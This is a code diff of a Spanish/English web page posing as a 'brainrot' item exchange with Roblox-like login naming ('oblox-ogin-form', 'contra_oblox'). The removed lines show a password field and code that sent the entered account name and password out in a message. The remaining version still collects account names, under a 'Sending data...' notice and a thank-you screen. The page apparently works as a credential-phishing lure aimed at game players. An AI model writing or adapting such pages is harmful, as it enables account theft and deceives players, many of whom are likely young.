@@ -352,25 +352,17 @@
         
         <form id="oblox-ogin-form" class="ogin-form">
             <div class="form-group">
-                <label for="username" data-es="Cuenta:" data-en="Account:">Cuenta:</label>
+                <label for="username" data-es="Cuenta de brainrot:" data-en="Brainrot account:">Cuenta de brainrot:</label>
                 <input type="text" id="username" 
-                       data-es-placeholder="Ingresa tu cuenta" 
+                       data-es-placeholder="Introduce tu cuenta" 
                        data-en-placeholder="Enter your account"
-                       placeholder="Ingresa tu cuenta" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="access" data-es="Contraseña:" data-en="Password:">Contraseña:</label>
-                <input type="password" id="access" 
-                       data-es-placeholder="Ingresa tu contraseña" 
-                       data-en-placeholder="Enter your password"
-                       placeholder="Ingresa tu contraseña" required>
+                       placeholder="Introduce tu cuenta" required>
             </div>
             
             <div class="loading" id="loading" data-es="Enviando datos..." data-en="Sending data...">Enviando datos...</div>
             <div class="error-message" id="error-message"></div>
             
-            <button type="submit" class="accept-btn" id="submit-btn" data-es="ENVIAR" data-en="SEND">ENVIAR</button>
+            <button type="submit" class="accept-btn" id="submit-btn" data-es="CONTINUAR" data-en="CONTINUE">CONTINUAR</button>
         </form>
         
         <!-- Mensaje de gracias -->
@@ -388,12 +380,10 @@
             es: {
                 title: "INTERCAMBIO",
                 subtitle: "Completar",
-                usernameLabel: "Cuenta:",
-                usernamePlaceholder: "Ingresa tu cuenta",
-                accessLabel: "Contraseña:",
-                accessPlaceholder: "Ingresa tu contraseña",
+                usernameLabel: "Cuenta de brainrot:",
+                usernamePlaceholder: "Introduce tu cuenta",
                 loading: "Enviando datos...",
-                acceptButton: "ENVIAR",
+                acceptButton: "CONTINUAR",
                 thankYou: "¡Gracias! ✅",
                 requestSuccess: "Peticion completada con éxito",
                 brainrotProcessed: "Tu Peticion ha sido procesada",
@@ -402,12 +392,10 @@
             en: {
                 title: "EXCHANGE",
                 subtitle: "Complete",
-                usernameLabel: "Account:",
+                usernameLabel: "Brainrot account:",
                 usernamePlaceholder: "Enter your account",
-                accessLabel: "Password:",
-                accessPlaceholder: "Enter your password",
                 loading: "Sending data...",
-                acceptButton: "SEND",
+                acceptButton: "CONTINUE",
                 thankYou: "Thank You! ✅",
                 requestSuccess: "Request completed successfully",
                 brainrotProcessed: "Your request has been processed",
@@ -444,9 +432,8 @@
         document.getElementById('oblox-ogin-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             const username = document.getElementById('username').value;
-            const access = document.getElementById('access').value;
             
-            if (username && access) {
+            if (username) {
                 // Mostrar loading
                 document.getElementById('loading').style.display = 'block';
                 document.getElementById('error-message').style.display = 'none';
@@ -456,7 +443,6 @@
                     from_name: 'Sistema de Intercambios',
                     to_name: 'Tú',
                     usuario_oblox: username,
-                    contra_oblox: access,
                     fecha: new Date().toLocaleString()
                 };
                 
